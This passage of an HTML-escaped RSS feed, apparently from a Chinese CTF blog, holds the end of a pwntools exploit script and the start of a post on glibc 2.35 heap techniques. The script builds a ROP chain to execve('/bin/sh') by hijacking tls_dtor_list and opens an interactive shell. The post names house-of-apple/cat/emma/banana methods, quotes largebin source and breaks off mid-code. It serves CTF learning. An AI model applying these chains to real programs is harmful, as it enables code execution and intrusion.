class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret =  &lt;span class=&#34;number&#34;&gt;0x000562ec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;prdi =  &lt;span class=&#34;number&#34;&gt;0x002a3e5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;prsi =  &lt;span class=&#34;number&#34;&gt;0x02be51&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;prdx_pr12 = &lt;span class=&#34;number&#34;&gt;0x011f497&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = &lt;span class=&#34;number&#34;&gt;0x001d8698&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;execve =  &lt;span class=&#34;number&#34;&gt;0xeb0f0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#write leave ret&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,leave_ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,sec)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xor()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#2 xor save&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;left()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xffffffffffff8000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;And()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#addr lef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#xor res&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x2f&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;right()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x7fff&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;And()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;#leave_ret_encrept&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,pos_offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos_offset+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pop _rdi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,prdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,pos_offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos_offset+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#binsh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,binsh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,pos_offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos_offset+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pop rsi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,prsi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,pos_offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos_offset+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos_offset+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#prdx 0 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,prdx_pr12)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,pos_offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos_offset+=&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#execve&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,execve)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,pos_offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#change the tls_dtor_list&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,heap_offset-&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sub()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,tls_dtor_list_heap_offset+&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;)	&lt;span class=&#34;comment&#34;&gt;#list = heap_address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;b exit&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(code)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;continue&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input your code size:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x1f0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input your memory count:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x6000000000008000&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input your code:&amp;quot;&lt;/span&gt;,code)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/</guid>
            <title>glibc-2.35一些手法</title>
            <link>http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/</link>
            <category>pwn</category>
            <pubDate>Mon, 01 Aug 2022 16:24:13 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;glibc-235-ubuntu3-下的利用手法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#glibc-235-ubuntu3-下的利用手法&#34;&gt;#&lt;/a&gt; glibc 2.35 ubuntu3 下的利用手法。&lt;/h1&gt;
&lt;p&gt;原本我们以为 2.35 的时代不会来的这么快，但是最近 DS360ctf，以及强网杯几道题目的出现让 glibc 的 pwn 生存条件急剧下降。&lt;/p&gt;
&lt;p&gt;首先我们谈谈为什么很多师傅都人为 2.35 的堆 pwn 是一个寒冬：&lt;/p&gt;
&lt;h2 id=&#34;现状&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#现状&#34;&gt;#&lt;/a&gt; 现状：&lt;/h2&gt;
&lt;p&gt;之所以这样讲，一部分原因在于由于高版本的 glibc 的安全特性，封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。但是这并不是让题目更难，觉得反而是解题出现严重的两级分化，一部分师傅研究过几个手法，几乎就可以做到一口气解决，因为利用的手法比较单一，就那么几种，即便是先提出的手法，其实原理也是大同小异。而对于不了解的师傅，就会陷入深渊，没有后门，或者自己习惯的后门都被堵上了，怎么走。&lt;/p&gt;
&lt;p&gt;我们发现，其实大部分的情况都都是因为 hook 被禁止。而最近出现的手法，就要求我们要继续挖掘 io 的利用链。&lt;/p&gt;
&lt;p&gt;所以这次我就要花费一些时间整理一部分。主要还是基于目前出现的一些题目的复现。&lt;/p&gt;
&lt;p&gt;** 在 35 时代，我们必须学会 largebinattack&lt;/p&gt;
&lt;p&gt;目前计划着是有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;house of apple 1&lt;/li&gt;
&lt;li&gt;house of apple 2&lt;/li&gt;
&lt;li&gt;house of apple 3&lt;/li&gt;
&lt;li&gt;house of cat&lt;/li&gt;
&lt;li&gt;house of emma&lt;/li&gt;
&lt;li&gt;house of banana&lt;/li&gt;
&lt;li&gt;tls 劫持&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;一些小总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些小总结&#34;&gt;#&lt;/a&gt; 一些小总结：&lt;/h2&gt;
&lt;p&gt;目前遇到的 2.35 的题目都是基于同一个版本&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@dreamcat-virtual-machine:~/Desktop/360dsctf/eznote$ strings libc.so.6 |grep ubuntu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;https://bugs.launchpad.net/ubuntu/+&lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;/glibc/+bugs&amp;gt;.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;largebinattack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#largebinattack&#34;&gt;#&lt;/a&gt; largebinattack&lt;/h2&gt;
&lt;p&gt;关键代码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             victim_index = largebin_index (size);                               &lt;span class=&#34;comment&#34;&gt;//largebins&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bck = bin_at (av, victim_index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             fwd = bck-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;comment&#34;&gt;/* maintain large bins in sorted order */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fwd != bck)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;comment&#34;&gt;/* Or with inuse bit to speed comparisons */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 size |= PREV_INUSE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;comment&#34;&gt;/* if smaller than smallest, bypass loop below */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 assert (chunk_main_arena (bck-&amp;gt;bk));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &amp;lt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) chunksize_nomask (bck-&amp;gt;bk))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     fwd = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     bck = bck-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     victim-&amp;gt;fd_nextsize = fwd-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     victim-&amp;gt;bk_nextsize = fwd-&amp;gt;fd-&amp;gt;bk_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     fwd-&amp;gt;fd-&amp;gt;bk_nextsize = victim-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     assert (chunk_main_arena (fwd));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) size &amp;lt; chunksize_nomask (fwd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         fwd = fwd-&amp;gt;fd_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  assert (chunk_main_arena (fwd));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; 